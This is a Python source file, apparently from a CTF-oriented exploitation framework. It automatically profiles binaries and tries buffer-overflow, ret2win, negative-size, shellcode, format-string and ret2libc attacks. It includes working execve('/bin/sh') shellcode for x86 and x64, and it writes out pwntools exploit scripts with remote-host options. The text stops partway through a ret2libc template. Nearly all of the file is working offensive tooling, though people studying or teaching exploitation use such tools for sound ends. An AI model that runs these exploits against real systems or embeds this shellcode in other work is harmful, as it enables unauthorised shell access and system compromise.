"""
Enhanced AutoExploit Module - Comprehensive Binary Exploitation.

This module extends the base AutoExploiter with additional techniques for
broader coverage across different CTF challenge types:

NEW TECHNIQUES:
1. Variable Overwrite - Overwrite stack variables to pass checks (jeeves pattern)
2. Negative Size Bypass - Signed/unsigned comparison bypass (optimistic pattern)
3. Restricted Shellcode - Byte-constrained shellcode execution (reconstruction pattern)
4. Stack Pivot - Use leaked addresses for shellcode execution with character restrictions
5. Iterative Fuzzing - Fuzz-to-exploit pipeline with crash analysis
6. Generic Template Generation - Always produce a starting template for any binary

Architecture:
- Uses iterative discovery: run binary, observe behavior, adapt
- Generates working exploits where possible, templates otherwise
- Each technique can produce partial results that inform other techniques
"""

import subprocess
import tempfile
import os
import time
import struct
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import TYPE_CHECKING, Dict, List, Optional, Tuple, Any, Set

if TYPE_CHECKING:
    from supwngo.core.binary import Binary

from supwngo.utils.logging import get_logger
from supwngo.exploit.offset_finder import cyclic, cyclic_find
from supwngo.exploit.verification import (
    ExploitVerifier,
    VerificationResult,
    VerificationLevel,
    verify_exploit,
    create_verified_exploit_script,
)

logger = get_logger(__name__)

# Marker for shell verification
PWNED_MARKER = "SUPWNGO_PWNED_SUCCESS"
PWNED_FILE = "pwned"


@dataclass
class BinaryProfile:
    """Profile of binary characteristics discovered through analysis."""
    # Input behavior
    prompts: List[bytes] = field(default_factory=list)  # Text before input
    input_count: int = 0  # Number of inputs expected
    input_types: List[str] = field(default_factory=list)  # "string", "number", "menu"

    # Address leaks
    leaked_addresses: Dict[str, int] = field(default_factory=dict)  # name -> address
    stack_leak: Optional[int] = None
    libc_leak: Optional[int] = None
    pie_base: Optional[int] = None

    # Security characteristics
    has_alarm: bool = False
    has_menu: bool = False
    is_shellcode_runner: bool = False  # Binary executes input as code

    # Vulnerability indicators
    buffer_size: Optional[int] = None  # Detected buffer size
    comparison_value: Optional[int] = None  # Magic value for comparisons
    comparison_offset: Optional[int] = None  # Offset to overwrite variable

    # Byte restrictions (for shellcode challenges)
    allowed_bytes: Optional[Set[int]] = None
    bad_bytes: Set[int] = field(default_factory=set)


@dataclass
class ExploitStrategy:
    """A potential exploitation strategy with required components."""
    name: str
    priority: int  # Lower = try first
    required_gadgets: List[str] = field(default_factory=list)
    required_leaks: List[str] = field(default_factory=list)
    applicable: bool = True
    notes: List[str] = field(default_factory=list)


class EnhancedAutoExploiter:
    """
    Enhanced automatic binary exploitation engine.

    Improvements over base AutoExploiter:
    1. Dynamic profiling - runs binary to understand behavior
    2. More vuln patterns - variable overwrite, negative size, restricted shellcode
    3. Always generates template - even if full exploit fails
    4. Iterative approach - uses partial info to refine exploitation

    Usage:
        exploiter = EnhancedAutoExploiter(binary)
        report = exploiter.run()

        # Always get a template, even on failure
        print(report.exploit_template)
    """

    # Common win function names
    WIN_FUNCTIONS = [
        "win", "flag", "shell", "get_flag", "print_flag", "read_flag",
        "give_shell", "spawn_shell", "backdoor", "secret", "winner",
        "cat_flag", "system_shell", "ez_win", "vuln_func", "getshell",
        "not_called", "hidden", "unused", "unreachable", "debug",
    ]

    # Magic values commonly used in CTF challenges
    MAGIC_VALUES = [
        0x1337bab3, 0xdeadbeef, 0xcafebabe, 0xbadc0de, 0x1337,
        0xfeedface, 0x41414141, 0xbaadf00d, 0x0d15ea5e,
    ]

    def __init__(
        self,
        binary: "Binary",
        timeout: float = 5.0,
        max_offset: int = 2048,
        libc_path: Optional[str] = None,
    ):
        """Initialize enhanced auto-exploiter."""
        self.binary = binary
        self.timeout = timeout
        self.max_offset = max_offset
        self.libc_path = libc_path

        self._binary_path = str(Path(binary.path).resolve())
        self._binary_dir = str(Path(binary.path).resolve().parent)

        # Analysis results
        self.profile = BinaryProfile()
        self._offset: Optional[int] = None
        self._win_func: Optional[Tuple[str, int]] = None
        self._gadgets: Dict[str, int] = {}
        self._binsh_addr: Optional[int] = None

        # Results
        self.successful = False
        self.technique_used = ""
        self.final_payload: bytes = b""
        self.exploit_script = ""
        self.exploit_template = ""  # Always generated
        self.attempts: List[Dict] = []
        self._captured_flag: Optional[str] = None  # Flag if captured
        self.verification_level = VerificationLevel.NONE

    def run(self) -> "EnhancedAutoExploiter":
        """
        Run enhanced auto-exploitation.

        Returns self for easy access to results.
        """
        # Phase 1: Static analysis
        self._static_analysis()

        # Phase 2: Dynamic profiling (run binary to understand behavior)
        self._dynamic_profile()

        # Phase 3: Try exploitation techniques in priority order
        strategies = self._rank_strategies()

        for strategy in strategies:
            if self.successful:
                break
            if not strategy.applicable:
                continue

            try:
                method = getattr(self, f"_try_{strategy.name}", None)
                if method:
                    method()
            except Exception as e:
                logger.debug(f"Strategy {strategy.name} failed: {e}")
                self.attempts.append({
                    "technique": strategy.name,
                    "result": "error",
                    "error": str(e),
                })

        # Phase 4: Always generate template
        self._generate_universal_template()

        return self

    def _static_analysis(self):
        """Perform static analysis on binary."""
        # Find win functions
        for name in self.WIN_FUNCTIONS:
            if name in self.binary.symbols:
                sym = self.binary.symbols[name]
                addr = sym.address if hasattr(sym, 'address') else sym
                self._win_func = (name, addr)
                logger.info(f"Found win function: {name} @ 0x{addr:x}")
                break

        # Find /bin/sh string
        self._binsh_addr = self._search_string("/bin/sh")

        # Find gadgets
        self._find_gadgets()

        # Check for shellcode runner indicators
        # Small static binaries with mmap/mprotect are often shellcode runners
        has_mmap = 'mmap' in self.binary.plt
        has_mprotect = 'mprotect' in self.binary.plt
        is_small = self._get_code_size() < 5000

        if is_small and (has_mmap or has_mprotect or not self.binary.protections.nx):
            self.profile.is_shellcode_runner = True

        # Check for alarm (timeout)
        if 'alarm' in self.binary.plt:
            self.profile.has_alarm = True

    def _dynamic_profile(self):
        """Run binary to understand its behavior."""
        try:
            # Run with simple input to capture prompts
            result = subprocess.run(
                [self._binary_path],
                input=b"test\n" * 10,
                capture_output=True,
                timeout=2.0,
                cwd=self._binary_dir,
            )

            output = result.stdout + result.stderr
            output_str = output.decode('latin-1', errors='ignore')

            # Look for address leaks
            self._parse_address_leaks(output_str)

            # Look for menu patterns
            if any(x in output_str.lower() for x in ['1.', '2.', '1)', '2)', 'choice', 'menu', 'option']):
                self.profile.has_menu = True

            # Look for input prompts
            prompt_patterns = [
                rb'[Nn]ame[:\s]', rb'[Ii]nput[:\s]', rb'[Ee]nter[:\s]',
                rb'[Ss]ize[:\s]', rb'[Ll]ength[:\s]', rb'[Aa]ge[:\s]',
                rb'[Ee]mail[:\s]', rb'>\s*$', rb':\s*$', rb'\?\s*$',
            ]
            for pattern in prompt_patterns:
                matches = re.findall(pattern, output)
                if matches:
                    self.profile.prompts.extend(matches)

            # Count input prompts to estimate input count
            self.profile.input_count = len(self.profile.prompts) or 1

        except subprocess.TimeoutExpired:
            # Timeout might indicate waiting for more input
            self.profile.input_count = 5  # Assume multiple inputs
        except Exception as e:
            logger.debug(f"Dynamic profiling failed: {e}")

    def _parse_address_leaks(self, output: str):
        """Parse output for leaked addresses."""
        # Common leak patterns
        patterns = [
            # "Address: 0x7fff..." or "gift: 0x..."
            r'(?:address|gift|leak|ptr|pointer|stack|heap|libc)[:\s]+0x([0-9a-fA-F]+)',
            # "0x7fff..." on its own line
            r'^0x([0-9a-fA-F]{8,16})$',
            # "Secret is at: 0x..."
            r'(?:at|is|=)[:\s]+0x([0-9a-fA-F]+)',
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, output, re.IGNORECASE | re.MULTILINE):
                try:
                    addr = int(match.group(1), 16)
                    # Classify the leak
                    if 0x7ff000000000 <= addr <= 0x7fffffffffff:
                        # Looks like stack address
                        self.profile.stack_leak = addr
                        self.profile.leaked_addresses['stack'] = addr
                    elif 0x7f0000000000 <= addr <= 0x7f0fffffffff:
                        # Looks like libc address
                        self.profile.libc_leak = addr
                        self.profile.leaked_addresses['libc'] = addr
                    elif 0x500000000000 <= addr <= 0x600000000000:
                        # Might be PIE base
                        self.profile.pie_base = addr
                        self.profile.leaked_addresses['pie'] = addr
                except ValueError:
                    pass

    def _rank_strategies(self) -> List[ExploitStrategy]:
        """Rank exploitation strategies by likelihood of success."""
        strategies = []

        # 1. Variable overwrite (simplest - just overflow to change a value)
        strategies.append(ExploitStrategy(
            name="variable_overwrite",
            priority=1,
            notes=["Simplest overflow - change stack variable to pass check"],
        ))

        # 2. ret2win (if win function exists)
        if self._win_func:
            strategies.append(ExploitStrategy(
                name="ret2win",
                priority=2,
                notes=[f"Win function found: {self._win_func[0]}"],
            ))

        # 3. Direct shellcode (if NX disabled and input might be executed)
        if not self.binary.protections.nx or self.profile.is_shellcode_runner:
            strategies.append(ExploitStrategy(
                name="direct_shellcode",
                priority=3,
                notes=["NX disabled or shellcode runner detected"],
            ))

        # 4. Negative size bypass (if read/scanf detected)
        has_read = 'read' in self.binary.plt
        has_scanf = 'scanf' in self.binary.plt or '__isoc99_scanf' in self.binary.plt
        if has_read or has_scanf:
            strategies.append(ExploitStrategy(
                name="negative_size_bypass",
                priority=4,
                notes=["read/scanf detected - try negative size"],
            ))

        # 5. Stack pivot with leak (if we have stack address)
        if self.profile.stack_leak:
            strategies.append(ExploitStrategy(
                name="stack_shellcode",
                priority=5,
                required_leaks=["stack"],
                notes=["Stack address leaked - can return to shellcode"],
            ))

        # 6. Format string
        if 'printf' in self.binary.plt:
            strategies.append(ExploitStrategy(
                name="format_string",
                priority=6,
                notes=["printf in PLT"],
            ))

        # 7. ret2system/ret2libc
        is_static = getattr(self.binary.protections, 'static', False) or not self.binary.plt
        if 'system' in self.binary.plt or not is_static:
            strategies.append(ExploitStrategy(
                name="ret2libc",
                priority=7,
                notes=["Dynamic binary - ret2libc possible"],
            ))

        # Sort by priority
        strategies.sort(key=lambda s: s.priority)
        return strategies

    def _try_variable_overwrite(self):
        """
        Try variable overwrite exploitation (jeeves pattern).

        Many CTF challenges have a pattern like:
        - char buf[64];
        - int magic = 0;
        - gets(buf);
        - if (magic == 0x1337bab3) win();

        We overflow buf to overwrite magic with the expected value.
        """
        attempt = {"technique": "variable_overwrite", "result": "failed"}

        # Try different buffer sizes and magic values
        buffer_sizes = [32, 40, 48, 56, 60, 64, 72, 80, 96, 100, 104, 112, 120, 128]

        for buf_size in buffer_sizes:
            for magic in self.MAGIC_VALUES:
                # Build payload: padding + magic value
                payload = b'A' * buf_size + struct.pack('<I', magic)

                if self._test_variable_overwrite(payload):
                    # Success!
                    self.successful = True
                    self.technique_used = "variable_overwrite"
                    self.final_payload = payload
                    self.profile.buffer_size = buf_size
                    self.profile.comparison_value = magic
                    self.profile.comparison_offset = buf_size

                    attempt["result"] = "success"
                    attempt["offset"] = buf_size
                    attempt["magic"] = hex(magic)
                    self.attempts.append(attempt)

                    self._generate_variable_overwrite_script(buf_size, magic)
                    return

        attempt["notes"] = ["Tried common buffer sizes and magic values"]
        self.attempts.append(attempt)

    def _test_variable_overwrite(self, payload: bytes) -> bool:
        """Test if variable overwrite payload works."""
        verifier = ExploitVerifier(self._binary_path, self.timeout)
        result = verifier.verify_payload(payload + b'\n')

        if result.success:
            # Store flag if captured
            if result.flag:
                self._captured_flag = result.flag
            # Update verification level
            if result.level.value > self.verification_level.value:
                self.verification_level = result.level
            return True

        return False

    def _try_ret2win(self):
        """Try ret2win exploitation."""
        if not self._win_func:
            return

        attempt = {"technique": "ret2win", "result": "failed"}
        win_name, win_addr = self._win_func

        # Try to find offset
        if not self._offset:
            self._offset = self._find_offset_iterative()

        if not self._offset:
            # Try common offsets
            common_offsets = [40, 56, 64, 72, 80, 88, 96, 104, 112, 120, 136, 152, 168]
            for test_offset in common_offsets:
                if self._test_ret2win(test_offset, win_addr):
                    self._offset = test_offset
                    break

        if not self._offset:
            attempt["notes"] = ["Could not find buffer offset"]
            self.attempts.append(attempt)
            return

        # Build payload
        payload = b"A" * self._offset

        # Stack alignment for 64-bit
        if self.binary.bits == 64 and 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])

        payload += self._p64(win_addr) if self.binary.bits == 64 else self._p32(win_addr)

        if self._test_ret2win(self._offset, win_addr):
            self.successful = True
            self.technique_used = "ret2win"
            self.final_payload = payload

            attempt["result"] = "success"
            attempt["offset"] = self._offset
            attempt["target"] = hex(win_addr)

            self._generate_ret2win_script(self._offset, win_addr, win_name)

        self.attempts.append(attempt)

    def _try_direct_shellcode(self):
        """Try direct shellcode execution."""
        attempt = {"technique": "direct_shellcode", "result": "failed"}

        # Generate standard shellcode
        shellcode = self._get_shellcode()

        try:
            from pwn import process, context as pwn_context
            pwn_context.log_level = 'error'
            pwn_context.arch = 'amd64' if self.binary.bits == 64 else 'i386'

            p = process([self._binary_path], cwd=self._binary_dir)
            p.sendline(shellcode)

            time.sleep(0.3)

            # Verify shell
            if self._verify_shell(p):
                self.successful = True
                self.technique_used = "direct_shellcode"
                self.final_payload = shellcode

                attempt["result"] = "success"
                self._generate_direct_shellcode_script(shellcode)

            p.close()
        except Exception as e:
            logger.debug(f"Direct shellcode failed: {e}")
            attempt["error"] = str(e)

        self.attempts.append(attempt)

    def _try_negative_size_bypass(self):
        """
        Try negative size bypass (optimistic pattern).

        Many binaries do: if (size <= MAX_SIZE) read(0, buf, size);
        When size is signed int and read takes size_t (unsigned),
        -1 passes the check but read() gets a huge value.
        """
        attempt = {"technique": "negative_size_bypass", "result": "failed"}

        if not self._win_func and not self.profile.stack_leak:
            attempt["notes"] = ["Need win function or stack leak"]
            self.attempts.append(attempt)
            return

        # Common negative values that pass signed checks
        negative_sizes = [-1, -2, -128, -256, -512, -1000]

        for neg_size in negative_sizes:
            # Try with win function
            if self._win_func:
                win_name, win_addr = self._win_func

                for offset in [72, 88, 104, 120, 136]:
                    payload = f"{neg_size}\n".encode()
                    payload += b"A" * offset
                    payload += self._p64(win_addr)

                    if self._test_negative_size(payload):
                        self.successful = True
                        self.technique_used = "negative_size_bypass"
                        self.final_payload = payload

                        attempt["result"] = "success"
                        attempt["size"] = neg_size
                        attempt["offset"] = offset

                        self._generate_negative_size_script(neg_size, offset, win_addr, win_name)
                        self.attempts.append(attempt)
                        return

        attempt["notes"] = ["Negative size bypass not successful"]
        self.attempts.append(attempt)

    def _test_negative_size(self, payload: bytes) -> bool:
        """Test negative size bypass payload."""
        try:
            result = subprocess.run(
                [self._binary_path],
                input=payload,
                capture_output=True,
                timeout=self.timeout,
                cwd=self._binary_dir,
            )

            output = (result.stdout + result.stderr).decode('latin-1', errors='ignore').lower()

            # Check for success
            for indicator in ['flag{', 'ctf{', 'htb{', 'win', 'congratulations']:
                if indicator in output:
                    return True

        except subprocess.TimeoutExpired:
            # Timeout might mean shell spawned
            return self._test_shell_with_payload(payload)
        except Exception as e:
            logger.debug(f"Negative size test failed: {e}")

        return False

    def _try_stack_shellcode(self):
        """
        Exploit using leaked stack address to jump to shellcode.

        When we have a stack leak and executable stack:
        1. Place shellcode in buffer
        2. Calculate shellcode address from leak
        3. Overwrite return address to point to shellcode
        """
        attempt = {"technique": "stack_shellcode", "result": "failed"}

        if not self.profile.stack_leak:
            attempt["notes"] = ["No stack leak available"]
            self.attempts.append(attempt)
            return

        if self.binary.protections.nx and not self.profile.is_shellcode_runner:
            attempt["notes"] = ["NX enabled, stack not executable"]
            self.attempts.append(attempt)
            return

        # Generate shellcode
        shellcode = self._get_shellcode()

        # Calculate buffer address relative to leaked address
        # This varies by binary - try common offsets from rbp
        rbp_offsets = [0x60, 0x70, 0x80, 0x40, 0x50, 0x100]

        for buf_offset_from_rbp in rbp_offsets:
            buf_addr = self.profile.stack_leak - buf_offset_from_rbp

            # Try different RIP offsets
            for rip_offset in [buf_offset_from_rbp + 8, buf_offset_from_rbp + 16]:
                # Build payload: shellcode + padding + return address
                padding_needed = rip_offset - len(shellcode)
                if padding_needed < 0:
                    continue

                payload = shellcode + b'\x90' * padding_needed + self._p64(buf_addr)

                if self._test_shell_with_payload(payload):
                    self.successful = True
                    self.technique_used = "stack_shellcode"
                    self.final_payload = payload

                    attempt["result"] = "success"
                    attempt["buf_addr"] = hex(buf_addr)
                    attempt["offset"] = rip_offset

                    self._generate_stack_shellcode_script(buf_offset_from_rbp, rip_offset)
                    self.attempts.append(attempt)
                    return

        attempt["notes"] = ["Could not find correct offsets"]
        self.attempts.append(attempt)

    def _try_format_string(self):
        """Try format string exploitation."""
        attempt = {"technique": "format_string", "result": "failed"}

        if 'printf' not in self.binary.plt:
            return

        try:
            from pwn import process, context as pwn_context
            pwn_context.log_level = 'error'

            # First, find format string offset
            p = process([self._binary_path], cwd=self._binary_dir)

            # Send format string probe
            probe = b"AAAA" + b".%p" * 30
            p.sendline(probe)

            try:
                output = p.recvall(timeout=2)
                output_str = output.decode('latin-1', errors='ignore')

                # Find offset where 0x41414141 appears
                parts = output_str.split('.')
                for i, part in enumerate(parts):
                    if '0x41414141' in part or '41414141' in part:
                        offset = i
                        attempt["offset"] = offset
                        attempt["notes"] = [f"Format string offset: {offset}"]
                        break

            except Exception:
                pass

            p.close()

        except Exception as e:
            logger.debug(f"Format string probe failed: {e}")
            attempt["error"] = str(e)

        # Generate template even if not fully exploited
        self._generate_format_string_template()
        attempt["result"] = "partial"
        self.attempts.append(attempt)

    def _try_ret2libc(self):
        """Try ret2libc exploitation."""
        attempt = {"technique": "ret2libc", "result": "failed"}

        # Check for necessary components
        has_puts = 'puts' in self.binary.plt
        has_printf = 'printf' in self.binary.plt
        leak_func = 'puts' if has_puts else ('printf' if has_printf else None)

        if not leak_func:
            attempt["notes"] = ["No leak function (puts/printf) in PLT"]
            self.attempts.append(attempt)
            return

        if 'pop_rdi' not in self._gadgets:
            attempt["notes"] = ["Missing pop rdi gadget"]
            self.attempts.append(attempt)
            return

        # Generate ret2libc template
        self._generate_ret2libc_template(leak_func)
        attempt["result"] = "partial"
        attempt["notes"] = ["Generated ret2libc template"]
        self.attempts.append(attempt)

    def _find_offset_iterative(self) -> Optional[int]:
        """Find buffer offset through iterative testing."""
        # Try cyclic pattern
        pattern = cyclic(self.max_offset)

        try:
            # Use GDB to get crash address
            gdb_script = """
set pagination off
set confirm off
run
info registers rip
quit
"""
            with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
                f.write(gdb_script)
                gdb_script_path = f.name

            result = subprocess.run(
                ['gdb', '-batch', '-x', gdb_script_path, self._binary_path],
                input=pattern,
                capture_output=True,
                timeout=self.timeout * 2,
            )

            output = result.stdout.decode('latin-1', errors='ignore')

            # Parse crash address
            rip_match = re.search(r'rip\s+0x([0-9a-fA-F]+)', output)
            if rip_match:
                crash_addr = int(rip_match.group(1), 16)
                offset = cyclic_find(crash_addr)
                if offset >= 0:
                    return offset

            os.unlink(gdb_script_path)

        except Exception as e:
            logger.debug(f"GDB offset finding failed: {e}")

        return None

    def _test_ret2win(self, offset: int, win_addr: int) -> bool:
        """Test ret2win with given offset."""
        payload = b"A" * offset

        if self.binary.bits == 64 and 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])

        payload += self._p64(win_addr) if self.binary.bits == 64 else self._p32(win_addr)

        # Use ExploitVerifier for proper verification
        verifier = ExploitVerifier(self._binary_path, self.timeout)
        result = verifier.verify_payload(payload + b'\n')

        if result.success:
            # Store flag if captured
            if result.flag:
                self._captured_flag = result.flag
            # Update verification level
            if result.level.value > self.verification_level.value:
                self.verification_level = result.level
            return True

        return False

    def _test_shell_with_payload(self, payload: bytes) -> bool:
        """Test if payload spawns a shell."""
        try:
            from pwn import process, context as pwn_context
            pwn_context.log_level = 'error'

            p = process([self._binary_path], cwd=self._binary_dir)
            p.sendline(payload)

            time.sleep(0.3)

            result = self._verify_shell(p)
            p.close()
            return result

        except Exception:
            return False

    def _verify_shell(self, proc) -> bool:
        """Verify shell access by creating pwned file."""
        verifier = ExploitVerifier(self._binary_path, self.timeout)
        result = verifier.verify_shell_access(proc)

        if result.success:
            # Update verification level
            if result.level.value > self.verification_level.value:
                self.verification_level = result.level
            # Store flag if captured
            if result.flag:
                self._captured_flag = result.flag
            return True

        return False

    def _search_string(self, s: str) -> Optional[int]:
        """Search for string in binary."""
        try:
            if hasattr(self.binary, '_elf') and self.binary._elf:
                results = list(self.binary._elf.search(s.encode()))
                if results:
                    return results[0]
        except Exception:
            pass
        return None

    def _find_gadgets(self):
        """Find useful ROP gadgets."""
        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)
            finder.find_gadgets()

            ret = finder.find_ret()
            if ret:
                self._gadgets['ret'] = ret.address

            pop_rdi = finder.find_pop_reg('rdi')
            if pop_rdi:
                self._gadgets['pop_rdi'] = pop_rdi.address

            syscall = finder.find_syscall()
            if syscall:
                self._gadgets['syscall'] = syscall.address

            pop_rax = finder.find_pop_reg('rax')
            if pop_rax:
                self._gadgets['pop_rax'] = pop_rax.address

        except Exception as e:
            logger.debug(f"Gadget finding failed: {e}")

    def _get_code_size(self) -> int:
        """Get total code size of binary."""
        try:
            code_size = 0
            for section in self.binary.sections.values():
                if section.name in ['.text', '.shellcode']:
                    code_size += section.size
            return code_size
        except Exception:
            return 10000  # Assume not small

    def _get_shellcode(self) -> bytes:
        """Get appropriate shellcode for architecture."""
        if self.binary.bits == 64:
            return (
                b"\x48\x31\xf6"              # xor rsi, rsi
                b"\x56"                      # push rsi
                b"\x48\xbf\x2f\x62\x69\x6e"  # movabs rdi, 0x68732f6e69622f
                b"\x2f\x2f\x73\x68"
                b"\x57"                      # push rdi
                b"\x54"                      # push rsp
                b"\x5f"                      # pop rdi
                b"\x48\x31\xd2"              # xor rdx, rdx
                b"\xb0\x3b"                  # mov al, 59
                b"\x0f\x05"                  # syscall
            )
        else:
            return (
                b"\x31\xc0"                  # xor eax, eax
                b"\x50"                      # push eax
                b"\x68\x2f\x2f\x73\x68"      # push "//sh"
                b"\x68\x2f\x62\x69\x6e"      # push "/bin"
                b"\x89\xe3"                  # mov ebx, esp
                b"\x50"                      # push eax
                b"\x53"                      # push ebx
                b"\x89\xe1"                  # mov ecx, esp
                b"\x31\xd2"                  # xor edx, edx
                b"\xb0\x0b"                  # mov al, 11
                b"\xcd\x80"                  # int 0x80
            )

    def _p64(self, addr: int) -> bytes:
        return addr.to_bytes(8, 'little')

    def _p32(self, addr: int) -> bytes:
        return addr.to_bytes(4, 'little')

    # === Script Generation ===

    def _generate_variable_overwrite_script(self, offset: int, magic: int):
        """Generate variable overwrite exploit script."""
        self.exploit_script = f'''#!/usr/bin/env python3
"""
Variable Overwrite Exploit for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

Technique: Overflow buffer to overwrite stack variable with magic value
Offset: {offset} bytes
Magic value: {hex(magic)}
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Build payload
    offset = {offset}
    magic = {hex(magic)}

    payload = b'A' * offset
    payload += p32(magic)

    log.info(f"Sending payload ({{len(payload)}} bytes)")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_ret2win_script(self, offset: int, win_addr: int, win_name: str):
        """Generate ret2win exploit script."""
        ret_gadget = self._gadgets.get('ret', 0)
        pack = "p64" if self.binary.bits == 64 else "p32"

        self.exploit_script = f'''#!/usr/bin/env python3
"""
ret2win Exploit for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

Target: {win_name} @ {hex(win_addr)}
Offset: {offset}
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Addresses
    win_addr = {hex(win_addr)}
    {"ret_gadget = " + hex(ret_gadget) if ret_gadget else "# No ret gadget needed"}

    # Build payload
    payload = b"A" * {offset}
    {"payload += p64(ret_gadget)  # Stack alignment" if self.binary.bits == 64 and ret_gadget else ""}
    payload += {pack}(win_addr)

    log.info(f"Sending payload ({{len(payload)}} bytes)")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_direct_shellcode_script(self, shellcode: bytes):
        """Generate direct shellcode exploit script."""
        self.exploit_script = f'''#!/usr/bin/env python3
"""
Direct Shellcode Exploit for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

Binary executes input as shellcode directly.
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # execve("/bin/sh") shellcode
    shellcode = bytes.fromhex("{shellcode.hex()}")

    log.info(f"Sending shellcode ({{len(shellcode)}} bytes)")
    io.sendline(shellcode)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_negative_size_script(self, size: int, offset: int, win_addr: int, win_name: str):
        """Generate negative size bypass exploit script."""
        self.exploit_script = f'''#!/usr/bin/env python3
"""
Negative Size Bypass Exploit for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

Technique: Bypass size check with negative value (signed vs unsigned)
Size: {size} (passes signed <= check, huge as unsigned)
Target: {win_name} @ {hex(win_addr)}
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Send negative size to bypass check
    io.sendline(b"{size}")

    # Build overflow payload
    offset = {offset}
    win_addr = {hex(win_addr)}

    payload = b"A" * offset
    payload += p64(win_addr)

    log.info(f"Sending payload ({{len(payload)}} bytes)")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_stack_shellcode_script(self, buf_offset: int, rip_offset: int):
        """Generate stack shellcode exploit script."""
        self.exploit_script = f'''#!/usr/bin/env python3
"""
Stack Shellcode Exploit for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

Technique: Use leaked stack address to jump to shellcode on stack
Stack leak type: {"RBP" if self.profile.stack_leak else "Unknown"}
Buffer offset from RBP: {hex(buf_offset)}
RIP offset: {rip_offset}
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.arch = "{'amd64' if self.binary.bits == 64 else 'i386'}"
context.log_level = "info"

def exploit():
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Get stack leak (adjust parsing as needed)
    io.recvuntil(b"gift: ")  # Adjust prompt
    leak = int(io.recvline().strip(), 16)
    log.success(f"Stack leak: {{hex(leak)}}")

    # Calculate buffer address
    buf_addr = leak - {hex(buf_offset)}
    log.info(f"Buffer at: {{hex(buf_addr)}}")

    # Build payload
    shellcode = asm(shellcraft.sh())
    padding = {rip_offset} - len(shellcode)

    payload = shellcode
    payload += b"\\x90" * padding
    payload += p64(buf_addr)

    log.info(f"Sending payload ({{len(payload)}} bytes)")
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_format_string_template(self):
        """Generate format string exploit template."""
        self.exploit_script = f'''#!/usr/bin/env python3
"""
Format String Exploit Template for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

TODO:
1. Find format string offset with: %p.%p.%p...
2. Leak addresses to defeat PIE/ASLR
3. Overwrite GOT or return address
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def find_offset():
    """Find format string offset."""
    io = process(BINARY)

    # Send probe
    io.sendline(b"AAAA" + b".%p" * 30)
    output = io.recvall(timeout=2).decode()

    # Look for 0x41414141 in output
    parts = output.split('.')
    for i, part in enumerate(parts):
        if '41414141' in part.lower():
            log.success(f"Format string offset: {{i}}")
            io.close()
            return i

    io.close()
    return None

def leak_addresses(offset):
    """Leak stack addresses."""
    io = process(BINARY)

    # Leak several positions
    payload = b""
    for i in range(1, 20):
        payload += f"%{{i}}$p.".encode()

    io.sendline(payload)
    output = io.recvall(timeout=2).decode()

    log.info(f"Leaked: {{output}}")
    io.close()

def exploit():
    offset = find_offset()
    if offset:
        leak_addresses(offset)

    # TODO: Build GOT overwrite or ret addr overwrite
    # payload = fmtstr_payload(offset, {{target: value}})

if __name__ == "__main__":
    exploit()
'''

    def _generate_ret2libc_template(self, leak_func: str):
        """Generate ret2libc exploit template."""
        got_entry = f"elf.got['{leak_func}']"
        plt_entry = f"elf.plt['{leak_func}']"

        self.exploit_script = f'''#!/usr/bin/env python3
"""
ret2libc Exploit Template for {Path(self._binary_path).name}
Generated by supwngo EnhancedAutoExploit

Two-stage attack:
1. Leak libc address via {leak_func}
2. Return to system("/bin/sh")

TODO: Find buffer offset and adjust payload
"""

from pwn import *

BINARY = "{self._binary_path}"
REMOTE_HOST = ""
REMOTE_PORT = 0
LIBC_PATH = ""  # Set to remote libc if known

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    # Use local libc or specified
    if LIBC_PATH:
        libc = ELF(LIBC_PATH, checksec=False)
    else:
        libc = elf.libc

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Find ROP gadgets
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

